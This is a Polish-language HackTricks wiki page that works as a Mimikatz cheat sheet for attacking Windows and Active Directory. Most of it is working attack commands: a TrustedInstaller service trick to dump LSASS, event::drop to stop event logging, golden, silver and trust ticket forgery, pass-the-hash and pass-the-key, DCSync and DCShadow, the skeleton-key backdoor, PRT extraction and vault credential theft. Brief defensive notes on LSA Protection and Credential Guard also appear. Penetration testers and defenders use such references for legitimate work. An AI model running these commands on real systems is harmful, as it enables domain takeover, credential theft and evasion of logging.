# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ta strona bazuje na stronie [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Sprawdź oryginał, aby uzyskać więcej informacji!<sup>[[3]](#references)</sup>

## LM i tekst jawny w pamięci

Od Windows 8.1 i Windows Server 2012 R2 wprowadzono istotne środki mające na celu ochronę przed kradzieżą poświadczeń:

- **Hasła LM i hasła w postaci jawnego tekstu** nie są już przechowywane w pamięci w celu zwiększenia bezpieczeństwa. Określone ustawienie rejestru, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, musi być skonfigurowane z wartością DWORD `0`, aby wyłączyć uwierzytelnianie Digest i zagwarantować, że hasła w postaci "clear-text" nie będą buforowane w LSASS.

- Wprowadzono **LSA Protection**, aby chronić proces Local Security Authority (LSA) przed nieautoryzowanym odczytem pamięci i wstrzykiwaniem kodu. Osiąga się to przez oznaczenie LSASS jako chronionego procesu. Aktywacja LSA Protection obejmuje:
1. Modyfikację rejestru w _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ przez ustawienie `RunAsPPL` na `dword:00000001`.
2. Wdrożenie obiektu zasad grupy (GPO), który wymusza tę zmianę rejestru na zarządzanych urządzeniach.

Pomimo tych zabezpieczeń narzędzia takie jak Mimikatz mogą omijać LSA Protection za pomocą określonych driverów, chociaż takie działania prawdopodobnie zostaną zapisane w event logs.

Na nowoczesnych stacjach roboczych ma to jeszcze większe znaczenie, ponieważ **Credential Guard jest domyślnie włączony w wielu systemach Windows 11 22H2+ i Windows Server 2025 dołączonych do domeny, które nie są kontrolerami domeny**, podczas gdy **LSASS-as-PPL jest domyślnie włączony w nowych instalacjach Windows 11 22H2+**. W praktyce oznacza to, że `sekurlsa::logonpasswords` często zwraca mniej informacji, niż oczekiwano w oparciu o starsze techniki, a operatorzy coraz częściej przechodzą do **offline minidumps**, **ekstrakcji kluczy Kerberos (`sekurlsa::ekeys`)** lub modułów ukierunkowanych na **CloudAP/PRT**. Informacje dotyczące ochrony znajdziesz na stronie [Windows credentials protections](credentials-protections.md).

### Counteracting SeDebugPrivilege Removal

Administratorzy zazwyczaj mają SeDebugPrivilege, co umożliwia im debugowanie programów. To uprawnienie może zostać ograniczone, aby uniemożliwić nieautoryzowane zrzuty pamięci — powszechną technikę wykorzystywaną przez atakujących do ekstrakcji poświadczeń z pamięci. Jednak nawet po odebraniu tego uprawnienia konto TrustedInstaller nadal może wykonywać zrzuty pamięci przy użyciu dostosowanej konfiguracji usługi:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Umożliwia to zrzucenie pamięci procesu `lsass.exe` do pliku, który następnie można przeanalizować w innym systemie w celu wyodrębnienia poświadczeń:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Opcje Mimikatz

Manipulowanie dziennikami zdarzeń w Mimikatz obejmuje dwa główne działania: czyszczenie dzienników zdarzeń oraz patchowanie usługi Event w celu uniemożliwienia rejestrowania nowych zdarzeń. Poniżej znajdują się polecenia służące do wykonywania tych działań:

#### Czyszczenie dzienników zdarzeń

- **Polecenie**: Działanie to ma na celu usunięcie dzienników zdarzeń, utrudniając śledzenie złośliwej aktywności.
- Mimikatz nie udostępnia w standardowej dokumentacji bezpośredniego polecenia do czyszczenia dzienników zdarzeń za pomocą wiersza poleceń. Manipulowanie dziennikami zdarzeń zwykle obejmuje użycie narzędzi systemowych lub skryptów spoza Mimikatz w celu wyczyszczenia określonych dzienników (np. za pomocą PowerShell lub Podglądu zdarzeń systemu Windows).

#### Funkcja eksperymentalna: patchowanie usługi Event

- **Polecenie**: `event::drop`
- To eksperymentalne polecenie ma modyfikować działanie usługi Event Logging, skutecznie uniemożliwiając jej rejestrowanie nowych zdarzeń.
- Przykład: `mimikatz "privilege::debug" "event::drop" exit`

- Polecenie `privilege::debug` zapewnia, że Mimikatz działa z uprawnieniami wymaganymi do modyfikowania usług systemowych.
- Polecenie `event::drop` następnie patchuje usługę Event Logging.

### Ataki na bilety Kerberos

Użyj poniższych poleceń jako szybkiego przypomnienia składni. Dedykowane strony dotyczące [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) oraz [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) zawierają aktualne informacje dotyczące niuansów AES/PAC/opsec.

### Tworzenie Golden Ticket

Golden Ticket umożliwia impersonację zapewniającą dostęp w całej domenie. Kluczowe polecenie i parametry:

- Polecenie: `kerberos::golden`
- Parametry:
- `/domain`: Nazwa domeny.
- `/sid`: Security Identifier (SID) domeny.
- `/user`: Nazwa użytkownika, którego należy impersonować.
- `/krbtgt`: Hash NTLM konta usługi KDC domeny.
- `/ptt`: Bezpośrednio wstrzykuje bilet do pamięci.
- `/ticket`: Zapisuje bilet do późniejszego użycia.

Przykład:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Tworzenie Silver Ticket

Silver Tickets zapewniają dostęp do określonych usług. Kluczowa komenda i parametry:

- Komenda: Podobnie jak w przypadku Golden Ticket, ale ukierunkowana na określone usługi.
- Parametry:
- `/service`: Usługa docelowa (np. cifs, http).
- Pozostałe parametry podobne jak w przypadku Golden Ticket.

Przykład:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Tickets są używane do uzyskiwania dostępu do zasobów między domenami poprzez wykorzystywanie relacji zaufania. Kluczowe polecenie i parametry:

- Command: Podobne do Golden Ticket, ale przeznaczone dla relacji zaufania.
- Parameters:
- `/target`: FQDN docelowej domeny.
- `/rc4`: Hash NTLM konta zaufania.

Example:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- Lists all Kerberos tickets for the current user session.

- **Pass the Cache**:

- Command: `kerberos::ptc`
- Injects Kerberos tickets from cache files.
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- Allows using a Kerberos ticket in another session.
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- Clears all Kerberos tickets from the session.
- Useful before using ticket manipulation commands to avoid conflicts.

### Over-Pass-the-Hash / Pass-the-Key

If `RC4` is disabled or unreliable, Mimikatz can patch **AES128/AES256 Kerberos keys** into the current logon session instead of only using an NT hash. This is usually a better fit for modern domains than treating `sekurlsa::pth` as NTLM-only.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` ponownie wykorzystuje bieżący proces zamiast uruchamiać nową konsolę, co jest przydatne, gdy chcesz od razu uruchamiać polecenia takie jak `lsadump::dcsync` w tym samym kontekście.

### Manipulowanie Active Directory

- **DCShadow**: Tymczasowo spraw, aby maszyna działała jako DC na potrzeby manipulowania obiektami AD. Zobacz [DCShadow](../active-directory-methodology/dcshadow.md).

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Naśladuj DC, aby żądać danych haseł. Zobacz [DCSync](../active-directory-methodology/dcsync.md).
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Dostęp do poświadczeń

- **LSADUMP::LSA**: Wyodrębnij poświadczenia z LSA.

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Podszyj się pod DC, używając danych hasła konta komputera.

- _W oryginalnym kontekście nie podano konkretnego polecenia dla NetSync._

- **LSADUMP::SAM**: Uzyskaj dostęp do lokalnej bazy danych SAM.

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Odszyfruj sekrety przechowywane w rejestrze.

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Ustaw nowy hash NTLM dla użytkownika.

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Pobierz informacje uwierzytelniające dotyczące relacji zaufania.
- `mimikatz "lsadump::trust" exit`

### Poświadczenia Cloud / Entra ID

Na hostach **Entra ID** lub **hybrid-joined** `sekurlsa::cloudap` może ujawnić dane buforowanego **Primary Refresh Token (PRT)** z LSASS. Jeśli powiązany klucz Proof-of-Possession jest chroniony programowo, `dpapi::cloudapkd` może wyprowadzić jawne/pochodne dane klucza potrzebne w kolejnych przepływach pracy **Pass-the-PRT**.<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
Staje się to znacznie trudniejsze, gdy klucz jest wspierany przez TPM, ale warto to sprawdzić na hybrydowych endpointach, ponieważ buforowane dane CloudAP mogą być ciekawsze niż klasyczny wynik `wdigest`.<sup>[[2]](#references)</sup> Informacje o łańcuchu nadużyć po stronie cloud znajdziesz w [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html).

### Różne

- **MISC::Skeleton**: Wstrzykuje backdoor do LSASS na DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Eskalacja uprawnień

- **PRIVILEGE::Backup**: Uzyskuje prawa do tworzenia kopii zapasowych.

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Uzyskuje uprawnienia debugowania.
- `mimikatz "privilege::debug" exit`

### Zrzucanie poświadczeń

- **SEKURLSA::LogonPasswords**: Wyświetla poświadczenia zalogowanych użytkowników.

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Ekstrahuje bilety Kerberos z pamięci.
- `mimikatz "sekurlsa::tickets /export" exit`

### Manipulowanie identyfikatorami SID i tokenami

- **SID::add/modify**: Zmienia SID i SIDHistory.

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _W oryginalnym kontekście nie podano konkretnego polecenia dla modify._

- **TOKEN::Elevate**: Podszywa się pod tokeny.
- `mimikatz "token::elevate /domainadmin" exit`

### Usługi terminalowe

- **TS::MultiRDP**: Umożliwia wiele sesji RDP.

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Wyświetla sesje TS/RDP.
- _W oryginalnym kontekście nie podano konkretnego polecenia dla TS::Sessions._

### Vault

- Ekstrahuje hasła z Windows Vault.
- `mimikatz "vault::cred /patch" exit`


## Odnośniki

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
